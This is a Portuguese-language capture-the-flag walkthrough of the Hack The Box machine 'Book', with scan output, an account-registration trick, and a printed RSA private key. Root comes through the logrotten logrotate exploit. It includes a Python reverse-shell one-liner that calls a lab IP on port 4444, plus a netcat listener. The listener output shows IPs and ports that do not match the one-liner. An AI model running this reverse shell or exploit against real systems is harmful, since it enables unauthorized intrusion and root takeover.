---
title: "Book"
date: 2020-10-19T14:29:02-03:00
draft: false
---

![HTB](/book-01.png)

```bash
Nmap scan report for 10.10.10.176
Host is up (0.43s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Abri o IP via web e fiz o meu cadastro

![HTB](/book-02.png)

Da direto para um  home.php

http://10.10.10.176/home.php

vou passar o dirsearch nele

```bash
[13:51:08] 301 -  312B  - /admin  ->  http://10.10.10.176/admin/
[13:51:12] 200 -    6KB - /admin/
[13:51:13] 200 -    6KB - /admin/?/login
[13:51:13] 403 -  277B  - /admin/.htaccess
[13:51:14] 302 -    0B  - /admin/home.php  ->  index.php
[13:51:14] 200 -    6KB - /admin/index.php
[13:51:35] 301 -  311B  - /docs  ->  http://10.10.10.176/docs/
[13:51:35] 403 -  277B  - /docs/
[13:51:42] 302 -    0B  - /home.php  ->  index.php
[13:51:44] 301 -  313B  - /images  ->  http://10.10.10.176/images/
[13:51:45] 200 -    7KB - /index.php
[13:51:45] 200 -    7KB - /index.php/login/
[13:52:07] 403 -  277B  - /server-status
[13:52:07] 403 -  277B  - /server-status/
[13:52:07] 302 -    0B  - /settings.php  ->  index.php
```

Ver porta 80, e uma página de login e registro, para entrar no site para ver acho até normal, porém existem três pontos que vale a pena notar:


- A interface contato indica que existe uma conta de administrador admin@book.htb

- A interface visualizar perfil indica que a permissão atual da conta é Usuário

- A interface coleções tem uma função de upload

Primeiro vou tentar registrar uma conta com admin@book.htb e ver se o Burp intercepta alguma coisa.

![HTB](/book-03.png)

![HTB](/book-04.png)

![HTB](/book-05.png)

![HTB](/book-06.png)

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA2JJQsccK6fE05OWbVGOuKZdf0FyicoUrrm821nHygmLgWSpJ
G8m6UNZyRGj77eeYGe/7YIQYPATNLSOpQIue3knhDiEsfR99rMg7FRnVCpiHPpJ0
WxtCK0VlQUwxZ6953D16uxlRH8LXeI6BNAIjF0Z7zgkzRhTYJpKs6M80NdjUCl/0
ePV8RKoYVWuVRb4nFG1Es0bOj29lu64yWd/j3xWXHgpaJciHKxeNlr8x6NgbPv4s
7WaZQ4cjd+yzpOCJw9J91Vi33gv6+KCIzr+TEfzI82+hLW1UGx/13fh20cZXA6PK
75I5d5Holg7ME40BU06Eq0E3EOY6whCPlzndVwIDAQABAoIBAQCs+kh7hihAbIi7
3mxvPeKok6BSsvqJD7aw72FUbNSusbzRWwXjrP8ke/Pukg/OmDETXmtgToFwxsD+
McKIrDvq/gVEnNiE47ckXxVZqDVR7jvvjVhkQGRcXWQfgHThhPWHJI+3iuQRwzUI
tIGcAaz3dTODgDO04Qc33+U9WeowqpOaqg9rWn00vgzOIjDgeGnbzr9ERdiuX6WJ
jhPHFI7usIxmgX8Q2/nx3LSUNeZ2vHK5PMxiyJSQLiCbTBI/DurhMelbFX50/owz
7Qd2hMSr7qJVdfCQjkmE3x/L37YQEnQph6lcPzvVGOEGQzkuu4ljFkYz6sZ8GMx6
GZYD7sW5AoGBAO89fhOZC8osdYwOAISAk1vjmW9ZSPLYsmTmk3A7jOwke0o8/4FL
E2vk2W5a9R6N5bEb9yvSt378snyrZGWpaIOWJADu+9xpZScZZ9imHHZiPlSNbc8/
ciqzwDZfSg5QLoe8CV/7sL2nKBRYBQVL6D8SBRPTIR+J/wHRtKt5PkxjAoGBAOe+
SRM/Abh5xub6zThrkIRnFgcYEf5CmVJX9IgPnwgWPHGcwUjKEH5pwpei6Sv8et7l
skGl3dh4M/2Tgl/gYPwUKI4ori5OMRWykGANbLAt+Diz9mA3FQIi26ickgD2fv+V
o5GVjWTOlfEj74k8hC6GjzWHna0pSlBEiAEF6Xt9AoGAZCDjdIZYhdxHsj9l/g7m
Hc5LOGww+NqzB0HtsUprN6YpJ7AR6+YlEcItMl/FOW2AFbkzoNbHT9GpTj5ZfacC
hBhBp1ZeeShvWobqjKUxQmbp2W975wKR4MdsihUlpInwf4S2k8J+fVHJl4IjT80u
Pb9n+p0hvtZ9sSA4so/DACsCgYEA1y1ERO6X9mZ8XTQ7IUwfIBFnzqZ27pOAMYkh
sMRwcd3TudpHTgLxVa91076cqw8AN78nyPTuDHVwMN+qisOYyfcdwQHc2XoY8YCf
tdBBP0Uv2dafya7bfuRG+USH/QTj3wVen2sxoox/hSxM2iyqv1iJ2LZXndVc/zLi
5bBLnzECgYEAlLiYGzP92qdmlKLLWS7nPM0YzhbN9q0qC3ztk/+1v8pjj162pnlW
y1K/LbqIV3C01ruxVBOV7ivUYrRkxR/u5QbS3WxOnK0FYjlS7UUAc4r0zMfWT9TN
nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
-----END RSA PRIVATE KEY-----
```

pip install pdfminer.six

![HTB](/book-07.png)

```bash
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jul  3 21:38:42 UTC 2020

  System load:  0.02               Processes:            143
  Usage of /:   26.6% of 19.56GB   Users logged in:      0
  Memory usage: 23%                IP address for ens33: 10.10.10.176
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

114 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 29 13:03:06 2020 from 10.10.14.3
reader@book:~$ 
```

Para pegar o root


```bash
reader@book:~$ cd backups/
reader@book:~/backups$ ls -la
total 12
drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .
drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..
-rw-r--r-- 1 reader reader    0 Jan 29 13:05 access.log
-rw-r--r-- 1 reader reader   91 Jan 29 13:05 access.log.1
reader@book:~/backups$ cat access.log.1 
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```

https://github.com/whotwagner/logrotten

dar um git clone no repositorio do  logrotten
e criar um arquivo dentro da maquina  exemplo:

- payloadfile


com o shell reverso

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

compila o arquivo 
```bash
reader@book:~ gcc -o logrotten logrotten.c
```
Agora só rodar com comando abaixo que é explicado no git do logrotten

```bash
reader@book:~ ./logrotten -p ./payloadfile /home/reader/backups/access.log
Waiting for rotating backups/access.log...
```

Em outro terminal deixe o netcat escutando na porta que vc colocou no shell reverso

```bash
$nc -nlvp 4444
listening on [any] 1234 ...
connect to [10.10.15.152] from (UNKNOWN) [10.10.10.176] 50008
```

Quando terminar de rodar o script do logrotten
ele vai conectar na janela do nlvp
ficando dessa forma:

```bash
#
```
Basta daar um cat agora
# cat /root/root.txt
